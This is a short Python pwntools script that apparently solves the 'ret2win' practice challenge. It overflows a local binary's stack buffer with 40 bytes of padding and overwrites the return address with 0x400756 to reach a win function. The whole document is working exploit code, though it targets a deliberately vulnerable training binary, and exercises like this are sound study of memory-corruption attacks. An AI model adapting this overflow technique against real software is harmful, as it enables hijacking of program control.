from pwn import *

pipe = process("./ret2win")

print(pipe.recvuntil("> "))
payload = "A" * 40
payload += p64(0x400756)

pipe.sendline(payload)
print(pipe.recvall())
